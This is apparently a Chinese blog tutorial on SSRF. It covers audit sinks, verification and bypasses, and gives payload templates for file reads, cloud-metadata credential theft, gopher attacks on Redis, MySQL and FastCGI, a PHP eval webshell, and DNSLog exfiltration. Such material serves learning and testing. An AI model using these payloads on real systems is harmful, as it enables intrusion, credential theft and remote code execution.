---
title: SSRF（服务端请求伪造）
date: 2026-08-24 19:00:00
categories:
  - Web安全
tags:
  - SSRF
  - 服务端请求伪造
  - 内网
description: SSRF（服务端请求伪造）
---

**SSRF（Server-Side Request Forgery，服务器端请求伪造）** 是一种由攻击者构造请求并由服务端发起的安全漏洞。由于请求源自服务器本身，因此可访问外网无法直接触达的 **内网系统、本地服务** 等敏感资源。

**形成原因** 多数源于服务端提供了从其他服务器获取数据的功能（如加载图片、抓取网页、下载文件等），但 **未对目标地址、协议、端口进行严格限制**。攻击者可控制URL参数，让服务器充当“代理”访问任意资源。

## 1. 一句话本质
**服务器替攻击者发起请求，攻击者借服务端的网络身份访问内网/本地服务，绕过网络边界限制。**

### 为什么成立？
+ 服务端有访问内网的权限（防火墙只防外部，不防内部）
+ 请求的 URL 由用户控制
+ 服务端没有严格校验 URL 的目标地址
+ 攻击者可以让服务端请求内网 IP、本地端口、云元数据等

### 核心条件
1. ✅ 服务端会发起 HTTP/网络请求
2. ✅ 请求的 URL 或参数用户可控
3. ✅ 没有严格的协议/域名/IP 校验

---

## 2. 代码特征（看到 = 有洞）
### 各语言危险函数
| 语言 | 危险函数/库 |
| --- | --- |
| **PHP** | `curl_exec()` / `curl_multi_exec()` |
|  | `file_get_contents($url)` |
|  | `fsockopen()` / `fopen()` |
|  | `simplexml_load_file()` |
| **Python** | `requests.get(url)` / `requests.post(url)` |
|  | `urllib.request.urlopen(url)` |
|  | `urllib2.urlopen(url)` |
|  | `httpx.get(url)` / `aiohttp.get(url)` |
| **Java** | `HttpClient.execute()` |
|  | `OkHttpClient.newCall()` |
|  | `URL.openConnection()` / `URLConnection` |
|  | `RestTemplate.getForObject()` |
| **Node.js** | `fetch(url)` |
|  | `axios.get(url)` / `axios.post(url)` |
|  | `http.get(url)` / `https.get(url)` |
|  | `request(url)` |
| **Go** | `http.Get(url)` / `http.Post(url)` |


### 常见触发场景
| 场景 | 说明 |
| --- | --- |
| **图片/文件 URL 加载** | 用户传 URL，服务端下载图片/文件 |
| **URL 分享预览** | 输入网址，服务端抓取页面生成预览 |
| **网页抓取器** | 爬虫、网页截图、HTML 转 PDF |
| **代理接口** | 服务端作为代理，转发请求到其他服务 |
| **回调/Webhook** | 用户设置回调地址，服务端请求 |
| **RSS 订阅** | 订阅 URL，服务端拉取 RSS 内容 |
| **第三方 API 调用** | 用户指定 API 地址，服务端调用 |


## 3. 审计路径（source → sink）
```plain
用户输入 URL/参数
    ↓
拼接到请求地址
    ↓
服务端发起请求（sink）
    ↓
返回结果给用户（可选）
```

### 详细审计步骤
#### 第一步：找 sink（请求函数）
```plain
搜 curl_exec / file_get_contents / requests.get / http.get 等
```

**重点看：**

+ URL 参数是怎么来的？
+ 是直接用用户输入，还是拼接的？
+ 有没有经过校验？

#### 第二步：找 source（用户输入）
```plain
看 URL 参数的来源：$_GET / $_POST / $_REQUEST / 数据库 / 配置文件
```

**判断可控性：**

+ 完全用户可控 → 高风险
+ 部分可控（只能改路径）→ 中风险
+ 完全不可控 → 低风险

#### 第三步：检查防护（三个重点）
| 检查点 | 怎么查 | 常见问题 |
| --- | --- | --- |
| **协议限制** | 有没有限制只能 http/https？ | 没限制 → 可以用 file/gopher/dict 等 |
| **域名校验** | 有没有校验域名？ | 校验方式不对 → 可绕过 |
| **IP 过滤** | 有没有过滤内网 IP？ | 过滤不完整 → 可绕过 |


#### 第四步：判断危害
| 情况 | 危害等级 |
| --- | :---: |
| 无任何限制 + 回显结果 | ⭐⭐⭐⭐⭐ |
| 无任何限制 + 不回显（盲 SSRF） | ⭐⭐⭐⭐ |
| 有协议限制但可绕过 + 回显 | ⭐⭐⭐⭐ |
| 有域名白名单但可绕过 | ⭐⭐⭐ |
| 严格防护 + 无法绕过 | ⭐ |


### 审计重点
1. **协议限制**：有没有 `CURLOPT_PROTOCOLS` / `scheme` 校验？
2. **重定向**：有没有跟随 302 跳转？跟随的话会不会跳到内网？
3. **DNS 解析**：校验域名的时候解析一次，请求的时候又解析一次？（DNS rebinding）
4. **IP 校验**：是校验域名解析后的 IP，还是只校验域名字符串？
5. **错误信息**：会不会把请求结果/错误返回给用户？（有回显更好利用）

---

## 4. 白盒验证
### 验证步骤
#### 第一步：确认漏洞存在
1. 找到 sink 函数
2. 确认 URL 参数用户可控
3. 确认没有严格的防护

#### 第二步：构造 PoC
**最简单的 PoC：**

```plain
http://127.0.0.1/
http://localhost/
```

**读文件 PoC：**

```plain
file:///etc/passwd
file:///c:/windows/system32/drivers/etc/hosts
```

**内网探测 PoC：**

```plain
http://10.0.0.1/
http://172.16.0.1/
http://192.168.1.1/
```

#### 第三步：验证防护是否有效
+ 协议限制：试试 `file://` / `gopher://` / `dict://`
+ 域名白名单：试试各种绕过方式
+ IP 过滤：试试各种 IP 编码方式

## 5. 黑盒验证
方法 1：HTTP 回显验证

如果目标会把请求结果返回给用户：

+ 让它请求 `http://example.com`，看返回的是不是 example.com 的内容
+ 让它请求 `http://127.0.0.1:80`，看返回的是不是本地服务

方法 2：DNSLog 验证（盲 SSRF 也能用）

1. 去 DNSLog 平台申请一个域名：`xxx.dnslog.cn`
2. 让目标请求 `http://xxx.dnslog.cn/`
3. 看 DNSLog 有没有收到请求
4. 有收到 → 存在 SSRF

**优点：** 不需要回显，盲 SSRF 也能测  
**缺点：** 只能证明存在，不能直接利用

方法 3：时间差验证（纯盲）

+ 请求一个不存在的内网 IP，看响应时间
+ 请求一个存在的内网 IP，看响应时间
+ 如果有明显差异 → 可能存在 SSRF

### 黑盒测试步骤
```plain
1. 找所有可能的 SSRF 参数（url / src / image / callback / webhook / proxy ...）
2. 每个参数都试 DNSLog 地址
3. 收到 DNS 请求 → 确认存在
4. 再试各种协议和内网地址
```

---

## 6. 利用与打法！
### 利用方式全景图
```plain
拿到 SSRF
│
├─ ① 先测协议能力
│   ├─ file:// 能读吗？→ 直接读 /flag、/etc/passwd、/proc/self/environ
│   └─ 只能 http/gopher/dict → 继续
│
├─ ② 看技术栈
│   ├─ PHP 站 → 重点查 9000
│   ├─ 有数据库 → 查 3306
│   └─ 有缓存 → 查 6379
│
├─ ③ dict:// 扫端口
│   ├─ 9000 开 → 【打 FastCGI】← 首选
│   ├─ 6379 开 → 【打 Redis 未授权】
│   ├─ 3306 开 → 试无密码; 不行就排除
│   └─ 全关 → file:// 读文件 / 打云元数据
│
└─ ④ 看题目提示（排除法）
    ├─ "mysql 有密码" → 排除 3306，打 9000/6379
    ├─ "需要拿 shell" → 优先 RCE（FastCGI/Redis）
    └─ 无提示 → 按优先级表直接打 FastCGI
```

| 利用方式 | 协议 | 效果 |
| --- | --- | --- |
| **读本地文件** | `file://` |  读取服务器本地文件（/etc/passwd、源码、配置文件等）   |
| **内网探测** | `http://` |  扫描内网 IP 段、端口，发现内网服务   |
| **云元数据** | `http://` |  读取云服务器元数据，拿 AccessKey/SecretKey/token   |
| **302 跳 Gopher  ** | `http://` → `gopher://` | 绕过协议限制，通过 302 跳转打 Redis/MySQL 等内网服务   |
| **302 跳 HTTP  ** | `http://` → `http://` | 绕过域名白名单 / 内网 IP 过滤，访问内网 Web 服务   |
| **打 Redis** | `gopher://` | 写 webshell / 写定时任务 / 写 SSH 公钥 / 主从复制 RCE |
| **打 MySQL** | `gopher://` |  写 webshell（INTO OUTFILE）/ UDF 提权 / 读数据库   |
| **打 FastCGI** | `gopher://` |  直接执行任意 PHP 代码（PHP-FPM 9000 端口）   |
| **打 Memcached？** | `gopher://` |  缓存投毒 / 命令执行 / 数据窃取   |
| **打 Zabbix** | `gopher://` |  未授权 RCE   |
| **打内网 Web** | `http://` |  访问内网未授权接口 / 打内网 Web 漏洞   |
| **端口扫描** | `dict://` / `http://` |  扫描内网端口开放情况，识别服务   |
| **DNS 外带** | `http://` |  把数据通过 DNS 查询带出（盲 SSRF 用）   |


### 详细说明
#### 1. 读本地文件（最简单）
**Payload：**

```plain
file:///etc/passwd
file:///proc/self/environ
file:///var/www/html/index.php
```

**条件：** 支持 file 协议 + 有回显

---

#### 2. 内网探测
**Payload：**

```plain
http://127.0.0.1:22/     # SSH
http://127.0.0.1:6379/   # Redis
http://127.0.0.1:3306/   # MySQL
http://127.0.0.1:8080/   # 常见内网端口
http://10.0.0.1/         # 内网网段
```

**判断端口是否开放：**

+ 响应快 + 有内容 → 开放
+ 响应慢 + 连接超时 → 不开放

---

#### 3. 云元数据（部分）
**AWS：**

```plain
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**阿里云：**

```plain
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

**腾讯云：**

```plain
http://metadata.tencentyun.com/latest/meta-data/
```

**拿到什么？**

+ AccessKey / SecretKey → 控制整个云账号
+ 实例 ID / 安全组配置
+ 临时 token

---

#### 4. 打 Redis（gopher 协议）
**能做什么？**

+ 写 webshell（`INTO OUTFILE`）
+ 写定时任务（`crontab`）
+ 写 SSH 公钥
+ 主从复制 RCE

**工具：** gopherus

---

#### 5. 打 MySQL（gopher 协议）
**能做什么？**

+ 写 webshell（`SELECT ... INTO OUTFILE`）
+ UDF 提权
+ 读数据库数据

**条件：** 知道用户名密码（空密码 / 弱口令）

---

#### 6. 打 FastCGI（gopher 协议）
**能做什么？**

+ 直接执行任意 PHP 代码
+ 不需要知道密码
+ 危害最大

**条件：** PHP-FPM 监听在 9000 端口，且可访问

---

## 7. Payload 模板
### 基础探测类
```plain
# 本地回环
http://127.0.0.1/
http://localhost/
http://0.0.0.0/

# 读文件
file:///etc/passwd
file:///c:/windows/system32/drivers/etc/hosts

# 云元数据
http://169.254.169.254/latest/meta-data/

# 端口探测
dict://127.0.0.1:6379/info
dict://127.0.0.1:3306/
```

### gopher 打 MySQL
```plain
gopher://127.0.0.1:3306/_[MySQL协议包]
```

**SQL 语句：**

```sql
SELECT '<?php eval($_POST[1]);?>' INTO OUTFILE '/var/www/html/shell.php'
```

**生成工具：** gopherus

### gopher 打 Redis
```plain
gopher://127.0.0.1:6379/_[Redis协议包]
```

**常用命令：**

```plain
SET shell "<?php eval($_POST[1]);?>"
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SAVE
```

### DNS 外带
```plain
http://[数据].xxx.dnslog.cn/
```

把要带的数据放在子域名里，通过 DNS 查询带出来。

---

## 8. 绕过技巧
### 绕过 1：IP 地址编码
| 编码方式 | 例子 | 说明 |
| --- | --- | --- |
| **十进制** | `http://2130706433/` | 127.0.0.1 的十进制 |
| **八进制** | `http://0177.0.0.1/` | 0 开头表示八进制 |
| **十六进制** | `http://0x7f000001/` | 0x 开头表示十六进制 |
| **混合编码** | `http://0x7f.0.0.1/` | 各段不同进制 |
| **IPv6** | `http://[::1]/` | IPv6 的回环地址 |
| **短地址** | `http://127.1/` | 省略中间的 0 |


---

### 绕过 2：域名解析绕过
| 绕过方式 | 例子 | 原理 |
| --- | --- | --- |
| **@ 符号** | `http://white.com@evil.com/` | 前面是用户名，后面才是域名 |
| **# 符号** | `http://white.com#evil.com/` | # 后面是锚点，实际请求 white.com |
| **? 符号** | `http://evil.com?white.com` | ? 后面是参数，域名还是 evil.com |
| **子域名** | `http://evil.white.com` | 白名单是 *.white.com 就绕过了 |
| **DNS rebinding** | 自定义 DNS 服务器 | 第一次解析返回白名单 IP，第二次返回内网 IP |


---

### 绕过 3：127.0.0.1 变体
```plain
http://127.0.0.1/
http://127.0.0.2/
http://127.1.2.3/
http://127.255.255.254/
http://0.0.0.0/
http://localhost/
http://[::1]/          # IPv6
http://0x7f000001/     # 十六进制
http://2130706433/     # 十进制
```

> 💡 127.x.x.x 整个网段都是回环地址，不只是 127.0.0.1
>

---

### 绕过 4：重定向绕过
如果目标校验了域名，但会跟随 302 跳转：

1. 自己搭一个服务器
2. 服务器返回 302 跳转到 `http://127.0.0.1/`
3. 目标请求白名单域名 → 被 302 到内网 → 绕过

**关键：** `CURLOPT_FOLLOWLOCATION` / `follow_redirects` 是否开启

---

### 绕过 5：协议绕过
| 情况 | 绕过方式 |
| --- | --- |
| 过滤了 `http://` | 用 `HTTP://`（大小写） |
| 过滤了 `file://` | 用 `File://` / `FILE://` |
| 只允许 http/https | 看能不能用 302 跳转到其他协议 |


---

### 绕过 6：URL 解析差异
不同语言/库对 URL 的解析不一样：

```plain
http://127.0.0.1\@white.com/
```

有的库认为域名是 `white.com`，有的认为是 `127.0.0.1`

利用这种差异，可以绕过校验但实际请求的是内网。

---

## 审计速查表
| 看到什么 | 想到什么 |
| --- | --- |
| `curl_exec($url)` | SSRF！有没有协议限制？ |
| `file_get_contents($url)` | SSRF！支持 file 协议吗？ |
| 用户传 URL 参数 | 会不会有 SSRF？ |
| 图片下载 / URL 预览 | 经典 SSRF 场景 |
| 没有 `CURLOPT_PROTOCOLS` | 默认支持所有协议 = 危险 |
| 跟随 302 跳转 | 可能可以跳转绕过白名单 |
| 只校验域名字符串 | DNS rebinding 绕过 |
| 云服务器 | 试试打元数据接口 |


---



